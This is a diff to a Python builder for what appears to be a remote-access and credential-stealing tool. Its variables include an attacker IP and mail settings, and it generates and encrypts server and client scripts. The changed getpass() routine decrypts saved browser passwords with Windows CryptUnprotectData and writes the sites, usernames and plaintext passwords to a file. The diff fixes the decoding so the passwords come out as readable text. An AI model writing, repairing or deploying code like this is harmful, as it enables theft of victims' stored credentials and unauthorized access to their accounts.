@@ -24,7 +24,7 @@ __license__ = "GPL"
 __version__ = "3.9.9"
 __maintainer__ = "Mario Nascimento"
 __email__ = "marionascimento@itsec.us"
-__status__ = "Release"
+__status__ = "Development"
 
 attacker_ip = ""
 loop = True
@@ -33,8 +33,7 @@ email = ""
 pwd = ""
 mailto = ""
 serverlineStart = 212
-serverlineStop = 320
-
+serverlineStop = 323
 while loop:
     os.system("cls")
     print(
@@ -203,6 +202,7 @@ error = u'{error}'\n"
     time.sleep(3)
     py2crypt("server.py")
     try:
+        # pass
         os.remove("server.py")
         os.remove("client.py")
     except Exception as err:
@@ -261,11 +261,13 @@ def getpass():
                 if os.path.exists(destination):
                     with open(destination, "a") as password:
                         password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
-                                       '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
+                                       '\n' + "Password: " + 
+                                       win32crypt.CryptUnprotectData(raw[2])[1].decode("utf-8") + '\n')
                 else:
-                    with open(destination, "a") as password:
+                    with open(destination, "w") as password:
                         password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
-                                       '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
+                                       '\n' + "Password: " + 
+                                       win32crypt.CryptUnprotectData(raw[2])[1].decode("utf-8") + '\n')
                 sites.append(raw[0])
         except:
             continue
@@ -317,7 +319,8 @@ if error == "1":
         None, u'Virtual memory is too low to run this program', u'Error', MB_OK | MB_ICONSTOP)
 if error != "1" and error != "0":
     ctypes.windll.user32.MessageBoxW(None, error, u'Error', MB_OK | MB_ICONSTOP)
-import os, queue, requests
+
+import os
 import cgi
 import http.server
 import urllib.parse as urlparse
